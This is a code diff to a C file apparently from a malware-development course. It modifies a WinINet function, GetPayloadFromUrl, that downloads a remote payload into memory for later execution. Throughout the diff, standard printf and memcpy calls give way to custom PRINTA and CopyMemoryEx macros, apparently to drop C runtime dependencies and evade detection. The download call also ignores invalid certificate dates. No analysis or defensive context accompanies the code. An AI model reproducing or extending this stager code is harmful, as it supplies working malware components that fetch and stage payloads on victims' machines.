@@ -5,8 +5,9 @@
 #include <wininet.h>
 #include <stdio.h>
 
-
+#include "Structs.h"
 #include "Common.h"
+#include "Debug.h"
 #pragma comment (lib, "wininet.lib")
 
 
@@ -40,7 +41,7 @@ BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize
     info("opening a handle to the internet session...");
     hInternet = InternetOpenW(L"MalDevAcademy", 0, NULL, NULL, 0);
     if (hInternet == NULL) {
-        printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
+        PRINTA("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
         bSTATE = FALSE; goto _EndOfFunction;
     }
     okay("got a handle!");
@@ -50,7 +51,7 @@ BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize
     info("getting the handle to the payload...");
     hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
     if (hInternetFile == NULL) {
-        printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
+        PRINTA("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
         bSTATE = FALSE; goto _EndOfFunction;
     }
     okay("got a handle!");
@@ -66,7 +67,7 @@ BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize
 
         // Reading 1024 bytes to the tmp buffer. The function will read less bytes in case the file is less than 1024 bytes.
         if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
-            printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
+            PRINTA("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
             bSTATE = FALSE; goto _EndOfFunction;
         }
 
@@ -87,7 +88,7 @@ BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize
         }
 
         // Append the temp buffer to the end of the total buffer
-        memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
+        CopyMemoryEx((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
 
         // Clean up the temp buffer
         memset(pTmpBytes, '\0', dwBytesRead);
@@ -111,7 +112,7 @@ BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize
     *sPayloadSize = sSize;
 
 
-    printf("\t[i] Bytes: [0x%p]\n", pBytes);
+    PRINTA("\t[i] Bytes: [0x%p]\n", pBytes);
 
 
 _EndOfFunction:
